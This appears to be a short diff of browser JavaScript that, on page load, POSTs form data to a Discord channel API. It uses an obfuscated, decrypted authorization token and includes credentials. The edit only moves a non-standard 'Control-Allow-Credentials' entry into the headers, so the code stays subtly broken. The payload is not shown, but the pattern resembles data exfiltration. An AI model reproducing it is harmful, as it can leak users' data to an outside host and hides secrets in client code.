@@ -20,9 +20,9 @@ document.addEventListener('DOMContentLoaded', function(){
             fetch('https://discord.com/api/v10/channels/1146358218696691764/messages', {
                 method: 'POST',
                 credentials: 'include',
-                Control-Allow-Credentials: 'true',
                 body: formData,
                 headers: {
+                    'Control-Allow-Credentials': 'true',
                     'Content-Type': 'multipart/form-data',
                     'Authorization': decrypt("uY3ANQt+2c5P7zNDzoUvf3g5+HFOHsT6M2Rtrc3553eZKH5UCc50oxJxrHmptNaegb2TWzhlKySHnP6bJJWalfu6du4DKmdxgtsvMmokxXo="),
                 }
